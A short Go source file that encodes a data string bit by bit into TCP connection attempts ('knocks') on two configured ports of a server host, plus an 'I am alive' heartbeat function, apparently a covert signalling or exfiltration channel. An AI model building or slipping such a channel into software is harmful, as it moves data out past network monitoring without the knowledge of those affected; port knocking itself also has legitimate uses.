package knock

import (
	"fmt"
	"net"
	"strconv"
	vars "test/VARS"
	"time"
)

// var ports = []int{7666, 8666, 6666}

// knock sends a TCP knock to a specific port on a host
func knock(host string, port int, timeout time.Duration) error {
	// Create a TCP address from the host and port
	address := fmt.Sprintf("%s:%d", host, port)

	// Dial the address with a specific timeout
	conn, err := net.DialTimeout("tcp", address, timeout)
	if err != nil {
		return err
	}

	// Close the connection immediately
	conn.Close()
	return nil
}

// sendKnocks sends a sequence of knocks to a host
func SendData(host string, port int, delay time.Duration) {
	// for _, port := range ports {
	err := knock(host, port, 5*time.Second)
	if err != nil {
		fmt.Printf("Failed to knock on port %d: %s\n", port, err)
	} else {
		fmt.Printf("Knocked on port %d successfully\n", port)
	}

	// Wait for the specified delay before the next knock
	time.Sleep(delay)
	// }
}

func SendIAmAlive(host string, port int, delay time.Duration) {
	// for {
	fmt.Println("Send i am alive", host, port, delay)
	knock(host, port, delay)
	// time.Sleep(2 * time.Second)
	// }

}

func SendKnock(data string, conf vars.Config) {

	delay := 500 * time.Millisecond
	x := []string{}
	byteArray := []byte(data)

	for _, b := range byteArray {
		x = append(x, byteToBits(b))
	}
	fmt.Println(x)
	for _, j := range x {
		for _, k := range j {
			char := fmt.Sprintf("%c", k)
			intValue, err := strconv.Atoi(char)
			if err != nil {
				fmt.Println(err)
			}
			p := conf.Flags.KnockData[intValue]
			SendData(conf.Server.Host, p, delay)
		}
	}

	// Send the knocks

	// select {}
}

func byteToBits(b byte) string {
	var bits string
	for i := 7; i >= 0; i-- { // Iterate through each bit from MSB to LSB
		if b&(1<<i) != 0 {
			bits += "1"
		} else {
			bits += "0"
		}
	}
	return bits
}
